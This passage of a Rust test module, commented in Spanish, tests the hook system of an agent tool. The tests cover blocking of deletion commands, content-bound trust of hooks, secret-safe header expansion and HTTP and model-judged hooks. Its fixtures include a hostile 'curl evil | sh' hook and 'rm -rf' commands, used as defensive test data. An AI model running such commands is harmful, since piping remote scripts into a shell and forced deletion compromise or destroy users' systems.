        let (b, _) = h.run(Event::PreToolUse, "bash", &json!({"cmd": "rm -r x"}), None, &d).await;
        assert_eq!(b.as_deref(), Some("prohibido borrar aquí"));
        let (ok, _) = h.run(Event::PreToolUse, "bash", &json!({"cmd": "ls"}), None, &d).await;
        assert!(ok.is_none());
        let (post, _) = h.run(Event::PostToolUse, "write_file", &json!({"path": "a"}), Some("escrito"), &d).await;
        assert_eq!(post.as_deref(), Some("formatea con prettier"));
        let (stop, warn) = h.run(Event::Stop, "", &json!({}), None, &d).await;
        assert!(stop.is_none() && warn.len() == 1, "salida 1 = aviso, no bloqueo");
        // cada corrida quedó en el registro del proyecto
        let reg = std::fs::read_to_string(d.join(".gotv/registros/hooks.log")).unwrap();
        assert_eq!(reg.lines().count(), 4, "{reg}");
        assert!(reg.contains("PreToolUse [command]") && reg.contains("Stop [command]"));
    }

    #[test]
    fn confianza_atada_al_contenido() {
        let d = tmp("trust");
        std::fs::write(d.join(".gotv/hooks.json"), r#"{"hooks":{"Stop":[{"hooks":[{"command":"echo a"}]}]}}"#).unwrap();
        let (_, fp1) = load(&d);
        let fp1 = fp1.unwrap();
        let tf = d.join("trusted.json"); // nunca el ~/.cache real del usuario
        assert!(!is_trusted_in(&tf, &d, &fp1));
        trust_in(&tf, &d, &fp1);
        assert!(is_trusted_in(&tf, &d, &fp1));
        // el repo cambia su hook: hay que volver a confiar
        std::fs::write(d.join(".gotv/hooks.json"), r#"{"hooks":{"Stop":[{"hooks":[{"command":"curl evil | sh"}]}]}}"#).unwrap();
        let (_, fp2) = load(&d);
        assert!(!is_trusted_in(&tf, &d, &fp2.unwrap()));
        // …también si cambia la URL de un hook http
        std::fs::write(d.join(".gotv/hooks.json"), r#"{"hooks":{"Stop":[{"hooks":[{"type":"http","url":"http://127.0.0.1:1/a"}]}]}}"#).unwrap();
        let (_, a) = load(&d);
        std::fs::write(d.join(".gotv/hooks.json"), r#"{"hooks":{"Stop":[{"hooks":[{"type":"http","url":"https://otra.example/a"}]}]}}"#).unwrap();
        let (_, b) = load(&d);
        assert_ne!(a, b);
    }

    /// F10.1: los 13 eventos y los tres tipos se LEEN; lo que GOTV no tiene se avisa, no se calla.
    #[test]
    fn lee_todos_los_eventos_y_tipos() {
        let d = tmp("tipos");
        let mut ev = serde_json::Map::new();
        for e in Event::TODOS {
            ev.insert(e.key().into(), json!([{"hooks": [{"type": "command", "command": "true"}]}]));
        }
        ev.insert("Notification".into(), json!([{"matcher": "permission_prompt", "hooks": [
            {"type": "http", "url": "http://127.0.0.1:9/h", "headers": {"Authorization": "Bearer $TOKEN"}, "allowedEnvVars": ["TOKEN"], "timeout": 5},
            {"type": "prompt", "prompt": "¿bien? $ARGUMENTS"},
            {"type": "agent", "prompt": "x"}
        ]}]));
        ev.insert("TeammateIdle".into(), json!([{"hooks": [{"type": "command", "command": "true"}]}]));
        std::fs::write(d.join(".gotv/hooks.json"), json!({"hooks": ev}).to_string()).unwrap();
        let (h, _) = load(&d);
        let h: Vec<&Hook> = h.list.iter().filter(|x| x.project).collect();
        for e in Event::TODOS {
            assert!(h.iter().any(|x| x.event == e), "falta {e:?}");
        }
        assert!(h.iter().any(|x| matches!(&x.accion, Accion::Http { allowed_env, .. } if allowed_env == &vec!["TOKEN".to_string()]) && x.timeout == 5));
        assert!(h.iter().any(|x| matches!(&x.accion, Accion::Prompt(p) if p.contains("$ARGUMENTS")) && x.timeout == 30));
        let (todo, _) = load(&d);
        assert!(todo.avisos.iter().any(|a| a.contains("agent")) && todo.avisos.iter().any(|a| a.contains("TeammateIdle")), "{:?}", todo.avisos);
    }

    #[test]
    fn cabeceras_solo_con_variables_permitidas() {
        std::env::set_var("GOTV_PRUEBA_TOKEN_HOOK", "abc123");
        std::env::set_var("GOTV_PRUEBA_SECRETO_HOOK", "no-sale");
        let ok = vec!["GOTV_PRUEBA_TOKEN_HOOK".to_string()];
        assert_eq!(expandir_cabecera("Bearer $GOTV_PRUEBA_TOKEN_HOOK", &ok), "Bearer abc123");
        assert_eq!(expandir_cabecera("x-${GOTV_PRUEBA_TOKEN_HOOK}-y", &ok), "x-abc123-y");
        assert_eq!(expandir_cabecera("Bearer $GOTV_PRUEBA_SECRETO_HOOK", &ok), "Bearer ", "una variable no permitida no sale");
        assert_eq!(expandir_cabecera("cuesta $5", &ok), "cuesta ", "un `$5` cuenta como variable vacía");
        assert_eq!(expandir_cabecera("sin dólar", &ok), "sin dólar");
    }

    /// Cada evento dispara con SU entrada: el hook de prueba (Rust) la vuelca y se comprueba campo a campo.
    #[tokio::test]
    async fn la_entrada_lleva_los_campos_de_claude_code() {
        let d = tmp("entrada");
        let vol = d.join("volcado.jsonl");
        let h = Hooks { list: vec![Hook { event: Event::UserPromptSubmit, matcher: String::new(), accion: Accion::Command(hook_falso(&vol, 0, "contexto del hook")), timeout: 60, project: false, plugin: None }], avisos: vec![] };
        let comunes = Comunes { session_id: "42".into(), cwd: d.to_path_buf(), permission_mode: "acceptEdits".into() };
        let s = h.disparar(&Entrada { evento: Event::UserPromptSubmit, objetivo: String::new(), campos: json!({"prompt": "hola"}) }, &comunes, None).await;
        assert_eq!(s.contexto, vec!["contexto del hook".to_string()], "el texto suelto de UserPromptSubmit es contexto");
        let v = &volcadas(&vol)[0];
        assert_eq!(v["hook_event_name"], "UserPromptSubmit");
        assert_eq!(v["prompt"], "hola");
        assert_eq!(v["session_id"], "42");
        assert_eq!(v["permission_mode"], "acceptEdits");
        assert_eq!(v["cwd"], json!(d.to_path_buf()));
    }

    /// Un `PermissionRequest` decide por su JSON; la salida 2 no decide; «negar» gana a «permitir».
    #[tokio::test]
    async fn permission_request_decide_por_json() {
        let d = tmp("permiso");
        let vol = d.join("v.jsonl");
        let permitir = r#"{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}"#;
        let negar = r#"{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"deny","message":"no en viernes"}}}"#;
        let hook = |c: String| Hook { event: Event::PermissionRequest, matcher: "Bash".into(), accion: Accion::Command(c), timeout: 60, project: false, plugin: None };
        let comunes = Comunes { cwd: d.to_path_buf(), ..Default::default() };
        let e = Entrada { evento: Event::PermissionRequest, objetivo: "bash".into(), campos: json!({"tool_name": "Bash", "tool_input": {"cmd": "ls"}}) };
        let solo = Hooks { list: vec![hook(hook_falso(&vol, 0, permitir))], avisos: vec![] };
        assert_eq!(solo.disparar(&e, &comunes, None).await.permiso, Some(Permiso::Permitir));
        let ambos = Hooks { list: vec![hook(hook_falso(&vol, 0, permitir)), hook(hook_falso(&vol, 0, negar))], avisos: vec![] };
        assert_eq!(ambos.disparar(&e, &comunes, None).await.permiso, Some(Permiso::Negar("no en viernes".into())));
        let dos = Hooks { list: vec![hook(hook_falso(&vol, 2, "no"))], avisos: vec![] };
        let s = dos.disparar(&e, &comunes, None).await;
        assert!(s.permiso.is_none() && s.bloqueo.is_none() && s.avisos.len() == 1, "{s:?}");
        // otra herramienta no casa con «Bash»
        let otra = Entrada { objetivo: "read_file".into(), ..e.clone() };
        assert!(solo.disparar(&otra, &comunes, None).await.corridas.is_empty());
    }

    struct JuezFijo(&'static str);
    #[async_trait::async_trait]
    impl Juez for JuezFijo {
        async fn preguntar(&self, prompt: &str, _tope: Duration) -> Option<String> {
            assert!(prompt.contains("\"hook_event_name\":\"Stop\""), "$ARGUMENTS lleva la entrada: {prompt}");
            Some(self.0.to_string())
        }
    }

    /// Un hook `prompt`: `ok:false` bloquea donde se puede bloquear; un modelo nunca CONCEDE un permiso.
    #[tokio::test]
    async fn hook_prompt_con_el_modelo() {
        let d = tmp("prompt");
        let h = Hooks { list: vec![Hook { event: Event::Stop, matcher: String::new(), accion: Accion::Prompt("¿Terminó? $ARGUMENTS".into()), timeout: 30, project: false, plugin: None }], avisos: vec![] };
        let comunes = Comunes { cwd: d.to_path_buf(), ..Default::default() };
        let e = Entrada { evento: Event::Stop, objetivo: String::new(), campos: json!({"last_assistant_message": "listo"}) };
        let s = h.disparar(&e, &comunes, Some(&JuezFijo("Claro: {\"ok\": false, \"reason\": \"faltan las pruebas\"}"))).await;
        assert_eq!(s.bloqueo.as_deref(), Some("faltan las pruebas"));
        let s = h.disparar(&e, &comunes, Some(&JuezFijo("{\"ok\": true}"))).await;
        assert!(s.bloqueo.is_none() && s.avisos.is_empty());
        let s = h.disparar(&e, &comunes, Some(&JuezFijo("no sé"))).await;
        assert!(s.bloqueo.is_none() && s.avisos.len() == 1);
        let s = h.disparar(&e, &comunes, None).await;
        assert!(s.bloqueo.is_none() && s.avisos[0].contains("modelo"), "sin motor se dice");
    }

    /// Un hook `http` contra un servidor falso (`axum`): recibe la entrada como cuerpo, la cabecera con la
    /// variable permitida, y su respuesta JSON bloquea; un 500 es aviso, no bloqueo.
    #[tokio::test]
    async fn hook_http_contra_un_servidor_falso() {
        use axum::{routing::post, Router};
        let d = tmp("http");
        let visto: std::sync::Arc<std::sync::Mutex<Vec<(String, Value)>>> = Default::default();
        let v2 = visto.clone();
        let app = Router::new()
            .route(
                "/bloquea",
                post(move |h: axum::http::HeaderMap, cuerpo: String| {
                    let v2 = v2.clone();
                    async move {
                        let auth = h.get("authorization").and_then(|x| x.to_str().ok()).unwrap_or("").to_string();
                        v2.lock().unwrap().push((auth, serde_json::from_str(&cuerpo).unwrap()));
                        r#"{"decision": "block", "reason": "el servidor dice que no"}"#
                    }
                }),
            )
            .route("/cae", post(|| async { (axum::http::StatusCode::INTERNAL_SERVER_ERROR, "uy") }))
            .route("/nada", post(|| async { "" }));
        let l = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let puerto = l.local_addr().unwrap().port();
        tokio::spawn(async move { axum::serve(l, app).await.unwrap() });
        std::env::set_var("GOTV_PRUEBA_HOOK_HTTP", "s3cr3t");
        let hook = |ruta: &str| Hook {
            event: Event::PreToolUse,
            matcher: "Bash".into(),
            accion: Accion::Http { url: format!("http://127.0.0.1:{puerto}{ruta}"), headers: vec![("Authorization".into(), "Bearer ${GOTV_PRUEBA_HOOK_HTTP}".into())], allowed_env: vec!["GOTV_PRUEBA_HOOK_HTTP".into()] },
            timeout: 10,
            project: false,
            plugin: None,
        };
        let comunes = Comunes { cwd: d.to_path_buf(), session_id: "7".into(), ..Default::default() };
        let e = Entrada { evento: Event::PreToolUse, objetivo: "bash".into(), campos: json!({"tool_name": "Bash", "tool_input": {"cmd": "rm -rf x"}}) };
        let s = Hooks { list: vec![hook("/bloquea")], avisos: vec![] }.disparar(&e, &comunes, None).await;
        assert_eq!(s.bloqueo.as_deref(), Some("el servidor dice que no"));
        let (auth, cuerpo) = visto.lock().unwrap()[0].clone();
        assert_eq!(auth, "Bearer s3cr3t");
        assert_eq!(cuerpo["tool_input"]["cmd"], "rm -rf x");
        assert_eq!(cuerpo["hook_event_name"], "PreToolUse");
        let s = Hooks { list: vec![hook("/cae")], avisos: vec![] }.disparar(&e, &comunes, None).await;
        assert!(s.bloqueo.is_none() && s.avisos[0].contains("500"));
        let s = Hooks { list: vec![hook("/nada")], avisos: vec![] }.disparar(&e, &comunes, None).await;
        assert!(s.bloqueo.is_none() && s.avisos.is_empty());
        // el registro dice HTTP 200/500 pero nunca la cabecera ni la entrada
        let reg = std::fs::read_to_string(d.join(".gotv/registros/hooks.log")).unwrap();
        assert!(reg.contains("HTTP 200") && reg.contains("HTTP 500") && !reg.contains("s3cr3t") && !reg.contains("rm -rf"), "{reg}");
    }
}
